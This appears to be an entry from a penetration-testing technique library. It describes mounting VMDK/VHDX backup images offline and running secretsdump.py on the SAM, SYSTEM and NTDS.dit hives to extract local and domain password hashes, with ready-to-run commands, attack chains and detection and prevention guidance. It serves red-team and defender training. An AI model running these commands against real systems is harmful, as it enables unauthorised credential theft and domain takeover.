examples.label: secretsdump the hives from the mount

notes:
=== Mount Virtual Disk — Offline Credential Access from VM Images ===
Mount .vhd/.vhdx/.vmdk files to access guest OS file system offline — no VM authentication needed.

=== WHY THIS IS HIGH-VALUE ===
Virtual disk files contain complete copies of running (or snapshot) OS file systems.
Mounting offline = full file system access without authenticating to the running VM.
Primary target: C:\Windows\System32\config (SAM + SYSTEM + SECURITY hives).
If DC VM is backed up → NTDS.dit accessible offline → all domain hashes.

=== LINUX MOUNTING ===
VMDK (VMware):
  sudo apt install libguestfs-tools
  sudo guestmount --add <image>.vmdk --inspector --ro /mnt/vmdk
  ls /mnt/vmdk/Windows/System32/config

VHD/VHDX (Hyper-V):
  sudo guestmount --add <image>.vhdx -m /dev/sda1 --ro /mnt/vhdx
  ls /mnt/vhdx/Windows/NTDS  (if DC)

Unmount when done:
  sudo guestunmount /mnt/vmdk

=== WINDOWS MOUNTING ===
VHD/VHDX: right-click in Explorer → Mount  OR  Disk Management → Action → Attach VHD  OR:
  Mount-VHD -Path C:\path\to\image.vhdx -ReadOnly
  Dismount-VHD -Path C:\path\to\image.vhdx

VMDK: requires VMware Workstation OR use 7-Zip to extract partition content

=== CREDENTIAL EXTRACTION AFTER MOUNTING ===
Local hashes:
  python3 secretsdump.py -sam /mnt/vmdk/Windows/System32/config/SAM -system /mnt/vmdk/Windows/System32/config/SYSTEM LOCAL

Domain hashes (from DC VM):
  python3 secretsdump.py -ntds /mnt/vmdk/Windows/NTDS/ntds.dit -system /mnt/vmdk/Windows/System32/config/SYSTEM LOCAL

=== WHERE TO FIND VIRTUAL DISK FILES ===
Backup shares on file servers (Hyper-V CSV backups, VMware datastore exports)
Network-attached storage (NAS) with automated backup jobs
Hyper-V host's C:\Users\Public\Documents\Hyper-V\Virtual hard disks
IT file shares with "VM" or "backup" in path

=== CHAINING CONTEXT ===
Virtual disk on backup share → mount → NTDS.dit + SYSTEM → secretsdump → all domain hashes
Hyper-V Admin → clone DC → export → mount → NTDS.dit → all domain hashes
VM backup file → mount → web.config → DB credentials → application pivot
Find .vmdk on share → mount on Linux → instant offline access to any Windows credentials
name: Misc - Mount Virtual Disk & Dump Hashes
description: A found VMDK/VHD(X) is a full filesystem. Mount it read-only on Linux, then run secretsdump against the SAM/SYSTEM/SECURITY hives to recover local account hashes.

defense.why_it_works: VM backup files (VMDK, VHDX) contain complete filesystem snapshots including the Windows registry hives (SAM, SYSTEM, SECURITY, NTDS.dit). On Linux, guestmount (libguestfs) can mount these virtual disk images without booting the VM. Once mounted, the registry hives are accessible and can be processed with secretsdump.py to extract all credentials — even if the running VM has Credential Guard enabled.
defense.prerequisites: Access to VM backup files (.vmdk or .vhdx) via network share, backup storage, or local filesystem. Linux host with libguestfs (guestmount). secretsdump.py available.
defense.impact: Complete credential extraction from all user accounts on the VM, including domain account hashes if the target is a DC. Bypasses all runtime protections (Credential Guard, EDR) since the attack is offline.
defense.detection: Unusual read access to VMDK/VHDX backup files from non-backup processes. Backup file transfer over network. Mounting of virtual disk images on unexpected hosts. Access to backup storage by non-backup service accounts.
defense.artifacts: File access: .vmdk or .vhdx read by non-hypervisor process | Network: large backup file transfer to attacker system | Process: guestmount and secretsdump execution
defense.prevention: Encrypt VM backup files at rest (BitLocker, vSphere VM Encryption, Azure Disk Encryption). Restrict access to backup storage to dedicated backup service accounts only. Audit access to backup repositories. Use dedicated backup networks isolated from production.
defense.misconfiguration: VM backup files stored on a network share accessible to domain users. Backup files unencrypted. No access monitoring on backup storage. DC backup files accessible from compromised workstations.
defense.vulnerable_config:
# On attacker Linux system:
guestmount --add OFFICEMGR.vmdk --inspector --ro /mnt/vhd -v
cd /mnt/vhd/Windows/System32/config
# Access SAM, SYSTEM, NTDS.dit files
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
defense.secure_config:
# Encrypt VM backups:
# vSphere: Enable VM Encryption on backup policies
# Azure: Enable Azure Disk Encryption before backup

# Restrict backup storage ACL:
icacls \\backupserver\vmbackups /inheritance:r /grant 'INLANEFREIGHT\svc_backup:(M)'

# Monitor backup storage access:
# Alert: backup files read by non-svc_backup accounts
